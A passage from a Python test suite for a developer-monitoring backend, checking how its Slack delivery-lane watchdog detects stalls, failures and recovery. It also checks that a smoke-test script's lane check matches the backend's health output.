            "SELECT card_id FROM cards WHERE source='dev-monitor-watchdog'"
        ).fetchone()['card_id']
        self.assertEqual(self.backend.MSG._conn().execute(
            'SELECT COUNT(*) FROM deliveries WHERE card_id=?', (card_id,)).fetchone()[0], 0)
        self.backend._lane_watchdog_once({
            'slack-urgent': 'urgent-hook', 'slack-routine': 'routine-hook',
        }, at=at + timedelta(seconds=5))
        self.assertEqual(self.backend.MSG._conn().execute(
            'SELECT COUNT(*) FROM deliveries WHERE card_id=? AND channel=?',
            (card_id, 'slack-routine')).fetchone()[0], 1)

    def test_watchdog_notices_continuing_failure_when_opposite_recovers(self):
        self._start({
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_URGENT': 'urgent-hook',
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_ROUTINE': 'routine-hook',
        })
        at = self.backend.MSG.now_utc()
        old = self.backend.MSG.iso(at - timedelta(minutes=31))
        with self.backend.MSG._conn() as conn:
            for lane in ('slack-urgent', 'slack-routine'):
                conn.execute(
                    'INSERT INTO deliveries(card_id, channel, status, created_at, next_attempt_at) '
                    'VALUES(?,?,?,?,?)', ('stalled-' + lane, lane, 'pending', old, old))
        active = set()
        recovery = {}
        webhooks = {'slack-urgent': 'urgent-hook', 'slack-routine': 'routine-hook'}
        self.backend._lane_watchdog_once(
            webhooks, active, at, recovery_candidates=recovery)
        self.assertEqual(self.backend.MSG._conn().execute(
            "SELECT COUNT(*) FROM cards WHERE source='dev-monitor-watchdog'"
        ).fetchone()[0], 2)
        self.assertEqual(self.backend.MSG._conn().execute(
            "SELECT COUNT(*) FROM deliveries d JOIN cards c ON c.card_id=d.card_id "
            "WHERE c.source='dev-monitor-watchdog'").fetchone()[0], 2)
        with self.backend.MSG._conn() as conn:
            conn.execute(
                "UPDATE deliveries SET status='sent', sent_at=? WHERE card_id='stalled-slack-routine'",
                (self.backend.MSG.iso(at + timedelta(seconds=5)),))
        self.backend._lane_watchdog_once(
            webhooks, active, at + timedelta(seconds=5), recovery_candidates=recovery)
        urgent_card = self.backend.MSG._conn().execute(
            "SELECT card_id FROM cards WHERE group_key='dev-monitor:lane-watchdog:slack-urgent'"
        ).fetchone()['card_id']
        self.assertEqual(self.backend.MSG._conn().execute(
            'SELECT channel FROM deliveries WHERE card_id=?', (urgent_card,)).fetchone()[0],
            'slack-routine')
        self.assertIn('slack-routine', active)
        for seconds in range(10, 130, 5):
            self.backend._lane_watchdog_once(
                webhooks, active, at + timedelta(seconds=seconds),
                recovery_candidates=recovery)
        self.assertNotIn('slack-routine', active)

    def test_watchdog_process_gap_is_not_continuous_recovery_evidence(self):
        self._start({
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_URGENT': 'urgent-hook',
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_ROUTINE': 'routine-hook',
        })
        at = self.backend.MSG.now_utc()
        old = self.backend.MSG.iso(at - timedelta(minutes=31))
        with self.backend.MSG._conn() as conn:
            conn.execute(
                'INSERT INTO deliveries(card_id, channel, status, created_at, '
                'next_attempt_at) VALUES(?,?,?,?,?)',
                ('gap-source', 'slack-routine', 'pending', old, old))
        webhooks = {'slack-urgent': 'urgent-hook', 'slack-routine': 'routine-hook'}
        active = set()
        recovery = {}
        self.backend._lane_watchdog_once(
            webhooks, active, at, recovery_candidates=recovery)
        with self.backend.MSG._conn() as conn:
            conn.execute(
                "UPDATE deliveries SET status='sent', sent_at=? WHERE card_id='gap-source'",
                (self.backend.MSG.iso(at + timedelta(seconds=5)),))
        self.backend._lane_watchdog_once(
            webhooks, active, at + timedelta(seconds=5), recovery_candidates=recovery)

        after_gap = at + timedelta(hours=2, seconds=5)
        self.backend._lane_watchdog_once(
            webhooks, active, after_gap, recovery_candidates=recovery)
        self.assertIn('slack-routine', active)
        self.assertIsNone(self.backend.MSG._conn().execute(
            "SELECT archived_at FROM cards WHERE group_key="
            "'dev-monitor:lane-watchdog:slack-routine'"
        ).fetchone()['archived_at'])

        # The healthy pass before the process gap and the one after it are two
        # observations.  Unobserved wall time contributes none.
        for index in range(MSG.LANE_WATCHDOG_RECOVERY_HEALTHY_PASSES - 3):
            self.backend._lane_watchdog_once(
                webhooks, active, after_gap + timedelta(seconds=20 * (index + 1)),
                recovery_candidates=recovery)
        self.assertIn('slack-routine', active)
        self.backend._lane_watchdog_once(
            webhooks, active, after_gap + timedelta(
                seconds=20 * (MSG.LANE_WATCHDOG_RECOVERY_HEALTHY_PASSES - 2)),
            recovery_candidates=recovery)
        self.assertNotIn('slack-routine', active)

    def test_watchdog_recovery_flap_keeps_current_incident_visible(self):
        self._start({
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_URGENT': 'urgent-hook',
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_ROUTINE': 'routine-hook',
        })
        at = self.backend.MSG.now_utc()
        old = self.backend.MSG.iso(at - timedelta(minutes=31))
        with self.backend.MSG._conn() as conn:
            conn.execute(
                'INSERT INTO deliveries(card_id, channel, status, created_at, '
                'next_attempt_at) VALUES(?,?,?,?,?)',
                ('flap-source', 'slack-routine', 'pending', old, old))
        webhooks = {'slack-urgent': 'urgent-hook', 'slack-routine': 'routine-hook'}
        active = set()
        recovery = {}
        self.backend._lane_watchdog_once(
            webhooks, active, at, recovery_candidates=recovery)
        card = self.backend.MSG._conn().execute(
            "SELECT card_id, title FROM cards WHERE group_key="
            "'dev-monitor:lane-watchdog:slack-routine'").fetchone()
        self.assertIn('stalled', card['title'])

        with self.backend.MSG._conn() as conn:
            conn.execute(
                "UPDATE deliveries SET status='sent', sent_at=? "
                "WHERE card_id='flap-source'",
                (self.backend.MSG.iso(at + timedelta(seconds=11)),))
        self.backend._lane_watchdog_once(
            webhooks, active, at + timedelta(seconds=11),
            recovery_candidates=recovery)
        self.assertIn('slack-routine', recovery)

        failed_at = at + timedelta(seconds=70)
        with self.backend.MSG._conn() as conn:
            for index in range(2):
                conn.execute(
                    'INSERT INTO deliveries(card_id, channel, status, created_at, '
                    'next_attempt_at, last_error, last_error_at) VALUES(?,?,?,?,?,?,?)',
                    ('flap-failed-%d' % index, 'slack-routine', 'failed',
                     self.backend.MSG.iso(failed_at), None, 'http 500',
                     self.backend.MSG.iso(failed_at)))
        self.backend._lane_watchdog_once(
            webhooks, active, failed_at, recovery_candidates=recovery)

        current = self.backend.MSG._conn().execute(
            'SELECT card_id, title, archived_at, last_seen FROM cards WHERE card_id=?',
            (card['card_id'],)).fetchone()
        self.assertEqual(current['card_id'], card['card_id'])
        self.assertIn('failed', current['title'])
        self.assertIsNone(current['archived_at'])
        self.assertEqual(current['last_seen'], self.backend.MSG.iso(failed_at))
        self.assertNotIn('slack-routine', recovery)
        self.assertEqual(self.backend.MSG._conn().execute(
            "SELECT COUNT(*) FROM events WHERE card_id=? "
            "AND kind='lane_watchdog_recovered'", (card['card_id'],)
        ).fetchone()[0], 0)

    def test_watchdog_slow_crossover_is_actually_sent_before_flap(self):
        self._start({
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_URGENT': 'urgent-hook',
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_ROUTINE': 'routine-hook',
        })
        at = self.backend.MSG.now_utc()
        old = self.backend.MSG.iso(at - timedelta(minutes=31))
        with self.backend.MSG._conn() as conn:
            conn.execute(
                'INSERT INTO deliveries(card_id, channel, status, created_at, '
                'next_attempt_at) VALUES(?,?,?,?,?)',
                ('slow-source', 'slack-routine', 'pending', old, old))
        webhooks = {'slack-urgent': 'urgent-hook', 'slack-routine': 'routine-hook'}
        active = set()
        recovery = {}
        self.backend._lane_watchdog_once(
            webhooks, active, at, recovery_candidates=recovery)
        with self.backend.MSG._conn() as conn:
            conn.execute(
                "UPDATE deliveries SET status='sent', sent_at=? "
                "WHERE card_id='slow-source'",
                (self.backend.MSG.iso(at + timedelta(seconds=5)),))
        self.backend._lane_watchdog_once(
            webhooks, active, at + timedelta(seconds=5),
            recovery_candidates=recovery)

        sent_at = at + timedelta(seconds=60)
        self.assertEqual(
            self._run_slack_worker_pass('slack-urgent', (True, 200, None), sent_at), 1)
        failed_at = at + timedelta(seconds=70)
        with self.backend.MSG._conn() as conn:
            for index in range(2):
                conn.execute(
                    'INSERT INTO deliveries(card_id, channel, status, created_at, '
                    'next_attempt_at, last_error, last_error_at) VALUES(?,?,?,?,?,?,?)',
                    ('slow-failed-%d' % index, 'slack-routine', 'failed',
                     self.backend.MSG.iso(failed_at), None, 'http 500',
                     self.backend.MSG.iso(failed_at)))
        self.backend._lane_watchdog_once(
            webhooks, active, failed_at, recovery_candidates=recovery)
        statuses = dict(self.backend.MSG._conn().execute(
            "SELECT status, COUNT(*) FROM deliveries d JOIN cards c ON c.card_id=d.card_id "
            "WHERE c.source='dev-monitor-watchdog' GROUP BY status").fetchall())
        self.assertEqual(statuses.get('sent'), 1)
        self.assertEqual(statuses.get('superseded', 0), 0)

    def test_watchdog_minute_flaps_are_bounded_on_actual_health_path(self):
        self._start({
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_URGENT': 'urgent-hook',
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_ROUTINE': 'routine-hook',
        })
        at = self.backend.MSG.now_utc()
        with self.backend.MSG._conn() as conn:
            conn.execute(
                'INSERT INTO deliveries(card_id, channel, status, created_at, '
                'last_error, last_error_at) VALUES(?,?,?,?,?,?)',
                ('minute-failure-initial', 'slack-routine', 'failed',
                 self.backend.MSG.iso(at), 'http 500', self.backend.MSG.iso(at)))
        webhooks = {'slack-urgent': 'urgent-hook', 'slack-routine': 'routine-hook'}
        active = set()
        recovery = {}
        self.backend._lane_watchdog_once(
            webhooks, active, at, recovery_candidates=recovery)
        self.assertEqual(
            self._run_slack_worker_pass(
                'slack-urgent', (True, 200, None), at + timedelta(seconds=1)),
            1)

        for minute in range(120):
            recovered_at = at + timedelta(minutes=minute, seconds=30)
            failed_at = at + timedelta(minutes=minute + 1)
            with self.backend.MSG._conn() as conn:
                conn.execute(
                    'INSERT INTO deliveries(card_id, channel, status, created_at, sent_at) '
                    'VALUES(?,?,?,?,?)',
                    ('minute-success-%d' % minute, 'slack-routine', 'sent',
                     self.backend.MSG.iso(recovered_at), self.backend.MSG.iso(recovered_at)))
            self.backend._lane_watchdog_once(
                webhooks, active, recovered_at, recovery_candidates=recovery)
            with self.backend.MSG._conn() as conn:
                for index in range(2):
                    conn.execute(
                        'INSERT INTO deliveries(card_id, channel, status, created_at, '
                        'last_error, last_error_at) VALUES(?,?,?,?,?,?)',
                        ('minute-failure-%d-%d' % (minute, index), 'slack-routine', 'failed',
                         self.backend.MSG.iso(failed_at), 'http 500',
                         self.backend.MSG.iso(failed_at)))
            self.backend._lane_watchdog_once(
                webhooks, active, failed_at, recovery_candidates=recovery)

        routine_cards = self.backend.MSG._conn().execute(
            "SELECT card_id, archived_at FROM cards WHERE group_key="
            "'dev-monitor:lane-watchdog:slack-routine'").fetchall()
        sent = self.backend.MSG._conn().execute(
            "SELECT COUNT(*) FROM deliveries d JOIN cards c ON c.card_id=d.card_id "
            "WHERE c.group_key='dev-monitor:lane-watchdog:slack-routine' "
            "AND d.status='sent'").fetchone()[0]
        self.assertEqual(len(routine_cards), 1)
        self.assertIsNone(routine_cards[0]['archived_at'])
        self.assertEqual(sent, 1)
        self.assertEqual(self.backend.MSG._conn().execute(
            "SELECT COUNT(*) FROM events WHERE card_id=? "
            "AND kind='lane_watchdog_recovered'", (routine_cards[0]['card_id'],)
        ).fetchone()[0], 0)

    def test_watchdog_terminal_crossover_retries_through_unhealthy_gate_for_72h(self):
        self._start({
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_URGENT': 'urgent-hook',
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_ROUTINE': 'routine-hook',
        })
        at = self.backend.MSG.now_utc()
        old = self.backend.MSG.iso(at - timedelta(minutes=31))
        with self.backend.MSG._conn() as conn:
            conn.execute(
                'INSERT INTO deliveries(card_id, channel, status, created_at, '
                'next_attempt_at) VALUES(?,?,?,?,?)',
                ('seventy-two-hour-source', 'slack-routine', 'pending', old, old))
        webhooks = {'slack-urgent': 'urgent-hook', 'slack-routine': 'routine-hook'}
        active = set()
        recovery = {}
        self.backend._lane_watchdog_once(
            webhooks, active, at, recovery_candidates=recovery)

        http_attempts = 0
        with contextlib.redirect_stderr(io.StringIO()):
            for step in range(1, 140):
                observed = at + timedelta(minutes=31 * step)
                http_attempts += self._run_slack_worker_pass(
                    'slack-urgent', (False, 404, None), observed)
                self.backend._lane_watchdog_once(
                    webhooks, active, observed, recovery_candidates=recovery)

        routine_card = self.backend.MSG._conn().execute(
            "SELECT card_id FROM cards WHERE group_key="
            "'dev-monitor:lane-watchdog:slack-routine'").fetchone()['card_id']
        attempts = self.backend.MSG._conn().execute(
            "SELECT COUNT(*) FROM deliveries WHERE card_id=? AND channel='slack-urgent' "
            "AND status='failed'", (routine_card,)).fetchone()[0]
        newest = self.backend.MSG.parse_rfc3339(self.backend.MSG._conn().execute(
            "SELECT MAX(created_at) FROM deliveries WHERE card_id=? "
            "AND channel='slack-urgent'", (routine_card,)).fetchone()[0])
        self.assertGreater(http_attempts, 100)
        self.assertGreater(attempts, 100)
        self.assertGreaterEqual(at + timedelta(hours=72) - newest, timedelta(0))
        self.assertLessEqual(
            at + timedelta(hours=72) - newest,
            self.backend.MSG.LANE_WATCHDOG_NOTICE_COOLDOWN)

    def test_watchdog_and_health_isolate_malformed_lane_timestamp(self):
        self._start({
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_URGENT': 'urgent-hook',
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_ROUTINE': 'routine-hook',
        })
        at = self.backend.MSG.now_utc()
        old = self.backend.MSG.iso(at - timedelta(minutes=31))
        with self.backend.MSG._conn() as conn:
            conn.execute(
                'INSERT INTO deliveries(card_id, channel, status, created_at, next_attempt_at) '
                'VALUES(?,?,?,?,?)', ('malformed', 'slack-urgent', 'pending', 'not-rfc3339', old))
            conn.execute(
                'INSERT INTO deliveries(card_id, channel, status, created_at, next_attempt_at) '
                'VALUES(?,?,?,?,?)', ('valid-stall', 'slack-routine', 'pending', old, old))
        stderr = io.StringIO()
        with contextlib.redirect_stderr(stderr):
            for index in range(120):
                self.backend._lane_watchdog_once({
                    'slack-urgent': 'urgent-hook', 'slack-routine': 'routine-hook',
                }, at=at + timedelta(seconds=5 * index))
        groups = {row['group_key'] for row in self.backend.MSG._conn().execute(
            "SELECT group_key FROM cards WHERE source='dev-monitor-watchdog'").fetchall()}
        self.assertEqual(groups, {
            'dev-monitor:lane-watchdog:slack-urgent',
            'dev-monitor:lane-watchdog:slack-routine',
        })
        self.assertEqual(self.backend.MSG._conn().execute(
            "SELECT COUNT(*) FROM deliveries d JOIN cards c ON c.card_id=d.card_id "
            "WHERE c.source='dev-monitor-watchdog'"
        ).fetchone()[0], 2)
        self.assertNotIn('evaluation error:', stderr.getvalue())
        self.assertEqual(stderr.getvalue().count('lane watchdog'), 2)
        self.assertIn('lane watchdog slack-urgent=stalled;', stderr.getvalue())
        self.assertIn(
            'lane watchdog slack-routine=stalled; opposite Slack lane slack-urgent '
            'is unhealthy, queued best-effort notice',
            stderr.getvalue())
        health = self.backend._message_lanes_health()
        self.assertEqual(health['slack-urgent']['delivery_state'], 'pending')
        self.assertEqual(health['slack-urgent']['ledger_error_count'], 0)
        self.assertEqual(health['slack-routine']['delivery_state'], 'pending')

    def test_watchdog_sqlite_permissive_timestamps_coalesce_without_exception_loop(self):
        self._start({
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_URGENT': 'urgent-hook',
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_ROUTINE': 'routine-hook',
        })
        at = self.backend.MSG.parse_rfc3339('2026-08-17T12:00:00Z')
        with self.backend.MSG._conn() as conn:
            for card_id, sent_at in (
                    ('hour-24', '2026-08-17T24:00:00Z'),
                    ('time-only', '00:00:00Z')):
                conn.execute(
                    'INSERT INTO deliveries(card_id, channel, status, sent_at) '
                    'VALUES(?,?,?,?)',
                    (card_id, 'slack-routine', 'sent', sent_at))
        stderr = io.StringIO()
        active = set()
        recovery = {}
        with contextlib.redirect_stderr(stderr):
            for index in range(120):
                self.backend._lane_watchdog_once(
                    {'slack-urgent': 'urgent-hook', 'slack-routine': 'routine-hook'},
                    active, at + timedelta(seconds=5 * index),
                    recovery_candidates=recovery)
        cards = self.backend.MSG._conn().execute(
            "SELECT title FROM cards WHERE group_key="
            "'dev-monitor:lane-watchdog:slack-routine'").fetchall()
        self.assertEqual(len(cards), 1)
        self.assertIn('ledger-invalid', cards[0]['title'])
        self.assertEqual(stderr.getvalue(), '')

    def test_watchdog_evaluation_error_preserves_existing_incident(self):
        self._start({
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_URGENT': 'urgent-hook',
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_ROUTINE': 'routine-hook',
        })
        at = self.backend.MSG.now_utc()
        card_id, _ = self.backend.MSG.record_lane_watchdog(
            'slack-urgent', {'state': 'failed', 'detail': 'existing incident'}, at)
        active = {'slack-urgent'}

        def reason(lane, worker_state, observed_at):
            if lane == 'slack-urgent':
                raise sqlite3.OperationalError('database is locked')
            return None

        stderr = io.StringIO()
        with unittest.mock.patch.object(
                self.backend.MSG, 'lane_watchdog_reason', side_effect=reason), \
                contextlib.redirect_stderr(stderr):
            self.backend._lane_watchdog_once({
                'slack-urgent': 'urgent-hook', 'slack-routine': 'routine-hook',
            }, active, at + timedelta(seconds=5))
        self.assertEqual(active, {'slack-urgent'})
        self.assertIn('OperationalError: database is locked', stderr.getvalue())
        self.assertEqual(self.backend.MSG._conn().execute(
            "SELECT COUNT(*) FROM events WHERE card_id=? AND kind='lane_watchdog_recovered'",
            (card_id,)).fetchone()[0], 0)
        self.assertIsNone(self.backend.MSG._conn().execute(
            'SELECT archived_at FROM cards WHERE card_id=?', (card_id,)
        ).fetchone()['archived_at'])

    def test_watchdog_evaluation_error_cancels_recovery_evidence(self):
        self._start({
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_URGENT': 'urgent-hook',
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_ROUTINE': 'routine-hook',
        })
        at = self.backend.MSG.now_utc()
        self.backend.MSG.record_lane_watchdog(
            'slack-urgent', {'state': 'failed', 'detail': 'existing incident'}, at)
        active = {'slack-urgent'}
        recovery = {}
        fail_evaluation = {'value': False}

        def reason(lane, worker_state, observed_at):
            if lane == 'slack-urgent' and fail_evaluation['value']:
                raise sqlite3.OperationalError('database is locked')
            return None

        webhooks = {'slack-urgent': 'urgent-hook', 'slack-routine': 'routine-hook'}
        with unittest.mock.patch.object(
                self.backend.MSG, 'lane_watchdog_reason', side_effect=reason), \
                contextlib.redirect_stderr(io.StringIO()):
            for index in range(
                    self.backend.MSG.LANE_WATCHDOG_RECOVERY_HEALTHY_PASSES - 1):
                self.backend._lane_watchdog_once(
                    webhooks, active, at + timedelta(seconds=5 * index),
                    recovery_candidates=recovery)
            fail_evaluation['value'] = True
            self.backend._lane_watchdog_once(
                webhooks, active, at + timedelta(minutes=3),
                recovery_candidates=recovery)
            fail_evaluation['value'] = False
            for index in range(
                    self.backend.MSG.LANE_WATCHDOG_RECOVERY_HEALTHY_PASSES - 1):
                self.backend._lane_watchdog_once(
                    webhooks, active, at + timedelta(minutes=4, seconds=20 * index),
                    recovery_candidates=recovery)
            self.assertIn('slack-urgent', active)
            self.backend._lane_watchdog_once(
                webhooks, active, at + timedelta(minutes=20),
                recovery_candidates=recovery)
        self.assertNotIn('slack-urgent', active)

    def test_watchdog_inactive_lane_discards_stale_recovery_evidence(self):
        self._start({
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_URGENT': 'urgent-hook',
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_ROUTINE': 'routine-hook',
        })
        at = self.backend.MSG.now_utc()
        self.backend.MSG.record_lane_watchdog(
            'slack-urgent', {'state': 'failed', 'detail': 'existing incident'}, at)
        webhooks = {'slack-urgent': 'urgent-hook', 'slack-routine': 'routine-hook'}
        active = {'slack-urgent'}
        recovery = {}
        with unittest.mock.patch.object(
                self.backend.MSG, 'lane_watchdog_reason', return_value=None):
            self.backend._lane_watchdog_once(
                webhooks, active, at + timedelta(seconds=5),
                recovery_candidates=recovery)
            self.assertEqual(recovery['slack-urgent'], 1)
            active.clear()
            self.backend._lane_watchdog_once(
                webhooks, active, at + timedelta(seconds=10),
                recovery_candidates=recovery)
            self.assertNotIn('slack-urgent', recovery)
            active.add('slack-urgent')
            for index in range(
                    self.backend.MSG.LANE_WATCHDOG_RECOVERY_HEALTHY_PASSES - 1):
                self.backend._lane_watchdog_once(
                    webhooks, active, at + timedelta(seconds=20 * (index + 1)),
                    recovery_candidates=recovery)
            self.assertIn('slack-urgent', active)
            self.backend._lane_watchdog_once(
                webhooks, active, at + timedelta(minutes=20),
                recovery_candidates=recovery)
        self.assertNotIn('slack-urgent', active)

    def test_watchdog_degraded_route_log_requires_an_actual_unhealthy_crossover(self):
        self._start({
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_URGENT': 'urgent-hook',
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_ROUTINE': 'routine-hook',
        })
        at = self.backend.MSG.now_utc()
        reasons = {
            'slack-urgent': None,
            'slack-routine': {'state': 'failed', 'detail': 'terminal failure'},
        }
        stderr = io.StringIO()

        def reason(lane, worker_state, observed_at):
            return reasons[lane]

        with unittest.mock.patch.object(
                self.backend.MSG, 'lane_watchdog_reason', side_effect=reason), \
                unittest.mock.patch.object(
                    self.backend.MSG, 'record_lane_watchdog', return_value=('card', True)), \
                unittest.mock.patch.object(
                    self.backend.MSG, 'enqueue_lane_watchdog_notice', return_value=True), \
                contextlib.redirect_stderr(stderr):
            self.backend._lane_watchdog_once(
                {'slack-urgent': 'urgent-hook', 'slack-routine': 'routine-hook'},
                active_incidents=set(), at=at)
        self.assertEqual(stderr.getvalue(), '')

    def test_watchdog_repeated_lock_errors_never_become_lane_incidents(self):
        self._start({
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_URGENT': 'urgent-hook',
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_ROUTINE': 'routine-hook',
        })
        at = self.backend.MSG.now_utc()
        calls = {'urgent': 0}

        def reason(lane, worker_state, observed_at):
            if lane == 'slack-urgent':
                calls['urgent'] += 1
                if calls['urgent'] % 2:
                    raise sqlite3.OperationalError('database is locked')
            return None

        stderr = io.StringIO()
        with unittest.mock.patch.object(
                self.backend.MSG, 'lane_watchdog_reason', side_effect=reason), \
                contextlib.redirect_stderr(stderr):
            active = set()
            for index in range(120):
                self.backend._lane_watchdog_once(
                    {'slack-urgent': 'urgent-hook', 'slack-routine': 'routine-hook'},
                    active, at + timedelta(seconds=5 * index))
        self.assertEqual(calls['urgent'], 120)
        self.assertEqual(stderr.getvalue().count('OperationalError: database is locked'), 60)
        self.assertEqual(active, set())
        self.assertEqual(self.backend.MSG._conn().execute(
            "SELECT COUNT(*) FROM cards WHERE source='dev-monitor-watchdog'"
        ).fetchone()[0], 0)
        self.assertEqual(self.backend.MSG._conn().execute(
            "SELECT COUNT(*) FROM deliveries d JOIN cards c ON c.card_id=d.card_id "
            "WHERE c.source='dev-monitor-watchdog'"
        ).fetchone()[0], 0)

    def test_watchdog_both_unhealthy_logs_both_unpublishable_incidents(self):
        self._start({
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_URGENT': 'urgent-hook',
            'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_ROUTINE': 'routine-hook',
        })
        at = self.backend.MSG.now_utc()
        old = self.backend.MSG.iso(at - timedelta(minutes=31))
        with self.backend.MSG._conn() as conn:
            for lane in ('slack-urgent', 'slack-routine'):
                conn.execute(
                    'INSERT INTO deliveries(card_id, channel, status, created_at, '
                    'next_attempt_at) VALUES(?,?,?,?,?)',
                    ('blocked-' + lane, lane, 'pending', old, old))
        stderr = io.StringIO()
        with contextlib.redirect_stderr(stderr):
            self.backend._lane_watchdog_once({
                'slack-urgent': 'urgent-hook', 'slack-routine': 'routine-hook',
            }, at=at)
        self.assertEqual(self.backend.MSG._conn().execute(
            "SELECT COUNT(*) FROM cards WHERE source='dev-monitor-watchdog'"
        ).fetchone()[0], 2)
        self.assertEqual(self.backend.MSG._conn().execute(
            "SELECT COUNT(*) FROM deliveries d JOIN cards c ON c.card_id=d.card_id "
            "WHERE c.source='dev-monitor-watchdog'"
        ).fetchone()[0], 2)
        for lane in ('slack-urgent', 'slack-routine'):
            self.assertIn(
                'lane watchdog %s=stalled; opposite Slack lane' % lane,
                stderr.getvalue())

    def test_lane_watchdog_loads_active_once_and_contains_exceptions(self):
        webhooks = {'slack-urgent': 'urgent-hook', 'slack-routine': ''}
        for failure in (None, RuntimeError('query failed')):
            stop = unittest.mock.Mock()
            stop.is_set.side_effect = [False, False, True]
            stderr = io.StringIO()
            active = set()
            with unittest.mock.patch.object(
                    self.backend.MSG, 'active_lane_watchdog_channels', return_value=active) as load, \
                    unittest.mock.patch.object(
                    self.backend, '_lane_watchdog_once', side_effect=failure) as once, \
                    contextlib.redirect_stderr(stderr):
                self.backend._lane_watchdog_loop(stop, webhooks)
            load.assert_called_once_with()
            self.assertEqual(len(once.call_args_list), 2)
            recovery = once.call_args_list[0].kwargs['recovery_candidates']
            self.assertIs(recovery, once.call_args_list[1].kwargs['recovery_candidates'])
            self.assertEqual(once.call_args_list[0].args, (webhooks, active))
            self.assertEqual(once.call_args_list[1].args, (webhooks, active))
            self.assertEqual(stop.wait.call_args_list, [
                unittest.mock.call(5), unittest.mock.call(5),
            ])
            if failure is not None:
                self.assertIn('lane watchdog error: query failed', stderr.getvalue())

    def test_worker_thread_start_failure_does_not_escape_or_report_on(self):
        made_threads = [unittest.mock.Mock() for _ in range(6)]
        made_threads[-1].start.side_effect = RuntimeError('cannot start worker')
        constructor = unittest.mock.Mock(side_effect=made_threads)
        stderr = io.StringIO()
        with contextlib.redirect_stderr(stderr):
            self._start({
                'AIRLOCK_DEV_MONITOR_SLACK_WEBHOOK_URGENT': 'urgent-hook',
            }, constructor)
        self.assertEqual(self.backend._messages_state(), 'off')
        self.assertIsNone(self.backend.OWNER_CONFIG)
        self.assertTrue(made_threads[0].start.called)
        self.assertTrue(made_threads[-1].start.called)
        for lane in ('slack-urgent', 'slack-routine'):
            self.assertNotEqual(
                self.backend._message_lanes_health()[lane]['worker_state'], 'on')
        self.assertIn('messages failed to start', stderr.getvalue())


class TestSmokeLaneCheckAgainstBackend(unittest.TestCase):
    """smoke.sh 의 lane 검사와 백엔드 /api/health 를 같은 시험에서 맞댄다.

    2026-08-24 라이브검증 실측 — 백엔드는 HEALTH_LANES(슬랙 둘 + email) 세 lane 을 내는데
    smoke.sh 의 expected_workers 는 슬랙 둘만 적어 두어, 첫 실기기 설치에서 "lane keys" 로
    주간 검증이 붉어졌다 (수정 = d6ce2aa). CI 는 살아 있는 백엔드가 없어 두 산출물의 표류를
    아무도 못 쟀다 — 그래서 여기서는 smoke.sh 에 **박혀 있는 그 검사 코드를 그대로 꺼내**
    진짜 backend 모듈의 _message_lanes_health() 출력에 대고 실행한다. 어느 쪽이 먼저
    움직이든 이 시험이 갈라진 날 붉어진다.

    양방향: ① messages 가 꺼진 구성(want=false)에서 검사가 통과해야 하고, ② 모양이 진짜로
    깨지면(lane 누락 · 필드 누락 · worker_state 불일치) 검사가 rc=1 로 실패해야 한다.
    """

    @classmethod
    def setUpClass(cls):
        here = os.path.dirname(os.path.abspath(__file__))
        cls.backend_dir = here
        smoke_path = os.path.join(here, os.pardir, 'smoke.sh')
        with open(smoke_path, encoding='utf-8') as f:
            lines = f.read().splitlines()
        # The lane check lives in one heredoc: lane_result=$(python3 - ... <<'PY' ... PY
        start = next(i for i, line in enumerate(lines)
                     if 'lane_result=$(python3' in line and "<<'PY'" in line)
        end = next(i for i in range(start + 1, len(lines)) if lines[i] == 'PY')
        cls.check_source = '\n'.join(lines[start + 1:end]) + '\n'
        # 양성 대조군 — 추출이 빈 문자열이나 엉뚱한 조각이면 아래 전부가 헛돈다.
        assert 'expected_workers' in cls.check_source and 'check_once' in cls.check_source

        backend_path = os.path.join(here, 'airlock-dev-monitor.py')
        spec = importlib.util.spec_from_file_location(
            'airlock_dev_monitor_smoke_lane_test', backend_path)
        cls.backend = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(cls.backend)

    def _serve_and_run(self, payload):
        """Serve payload as /api/health and run the smoke's lane check against it."""
        import http.server

        body = json.dumps(payload).encode('utf-8')

        class Health(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *args):
                pass

        server = http.server.HTTPServer(('127.0.0.1', 0), Health)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        try:
            # smoke.sh 와 같은 argv: want=false(콘솔 꺼짐), env 파일 없음, 포트, backend 경로.
            proc = subprocess.run(
                ['python3', '-', 'false', '/nonexistent/dev-monitor.env',
                 str(server.server_address[1]), self.backend_dir],
                input=self.check_source, capture_output=True, text=True, timeout=60)
        finally:
            server.shutdown()
            thread.join(timeout=5)
            server.server_close()
        return proc

    def _off_health(self):
        # 콘솔이 꺼진 설치의 실제 백엔드 출력 — idle fallback + per-lane off 문구.
        self.backend._MESSAGES_STATE = 'off'
        self.backend.OWNER_CONFIG = None
